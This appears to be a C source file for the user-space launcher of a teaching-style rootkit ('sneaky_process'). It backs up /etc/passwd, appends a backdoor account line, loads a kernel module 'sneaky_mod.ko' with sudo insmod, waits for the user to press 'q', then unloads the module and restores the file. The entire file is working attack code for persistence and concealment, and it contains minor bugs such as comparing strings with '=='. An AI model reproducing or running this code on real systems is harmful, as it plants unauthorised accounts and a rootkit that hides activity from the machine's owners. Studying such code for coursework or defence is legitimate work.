#include<stdlib.h>
#include<stdio.h>
#include<string.h>




void copy() {
    FILE *source, *target;
    char ch;
    source = fopen("/etc/passwd", "r");
    if (source == NULL) {
        perror("fail to open: /etc/passwd\n");
    }
    target = fopen("/tmp/passwd", "w");
    if (target == NULL) {
        fclose(source);
        perror("fail to open: /tmp/passwd\n");     
    }
    while ((ch = fgetc(source)) != EOF) {
        fputc(ch, target);
    }
    fclose(source);
    fclose(target);
    target = fopen("/etc/passwd", "a");
    if (target == NULL) {
        perror("fail to open: /etc/passwd\n");     
    }
    fprintf(target, "\n%s", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
    fclose(target);
    // printf("copy and append finished\n");
}


void restore() {
    FILE *source, *target;
    char ch;
    source = fopen("/tmp/passwd", "r");
    if (source == NULL) {
        perror("fail to open: /tmp/passwd\n");
    }
    target = fopen("/etc/passwd", "w");
    if (target == NULL) {
        fclose(source);
        perror("fail to open: /etc/passwd\n");     
    }
    while ((ch = fgetc(source)) != EOF) {
        fputc(ch, target);
    }
    fclose(source);
    fclose(target);
}


void execute(char *command) {
    pid_t pid, w;
    pid = fork();
    if (pid == 0) {
        if (command == "load") {
            long ppid = getppid();
            //printf("process_id =%ld\n", ppid);
            char *process_id[50];
            sprintf(process_id, "process_id=%ld", ppid);
            char *args[] = {"sudo", "insmod", "sneaky_mod.ko", process_id,  NULL};
            if (execvp(args[0], args) == -1) {
                perror("execvp");
            }
        }
        else {
            char *args[] = {"sudo", "rmmod", "sneaky_mod.ko",  NULL};
            if (execvp(args[0], args) == -1) {
                perror("execvp");
            }
        } 
    }
    else if (pid < 0) {
        perror("fork error");
    }
    else {
        w = waitpid(pid, NULL, 0);
        if (w == -1) {
            perror("waitpid");
        }
    }
}

int loop(FILE *f) {
    int c;
    while ((c = fgetc(f)) != EOF) {
        if (c == 'q') {
            return 0;
        }
        //printf("c = %c  ", c);
    }
    return 0;
}
    



int main() {
    printf("sneaky_process pid=%d\n", getpid());
    copy();
    execute("load");
    int status;
    do {
        status = loop(stdin);
    } while (status);
    execute("unload");
    restore();
    return EXIT_SUCCESS;
}
